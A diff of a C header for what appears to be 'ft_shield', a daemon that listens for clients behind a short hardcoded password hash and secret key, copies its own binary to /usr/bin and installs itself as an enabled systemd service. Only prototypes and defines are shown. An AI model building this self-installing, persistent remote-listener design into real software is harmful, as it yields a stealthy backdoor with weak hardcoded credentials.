@@ -15,6 +15,9 @@
 #define MAX_CLIENTS 3
 #define AUTH_PASSWORD_HASH "8fb9f8fd"
 #define SECRET_KEY 54
+#define SOURCE_FILE "ft_shield"
+#define DEST_FILE "/usr/bin/ft_shield"
+#define SERVICE_NAME "ft_shield.service"
 
 int create_server_socket();
 void bind_and_listen(int server_fd, struct sockaddr_in* address);
@@ -25,7 +28,7 @@ int authenticate_client(int client_socket);
 void hash(const char *password, char *hash);
 void ensure_single_instance();
 void create_daemon();
-void copy_binary(const char* source_path, const char* dest_path);
+void copy_binary_file(const char *sourcePath, const char *destinationPath);
 void create_systemd_service(const char* service_name, const char* binary_path);
 void enable_and_start_service(const char* service_name);
 #endif
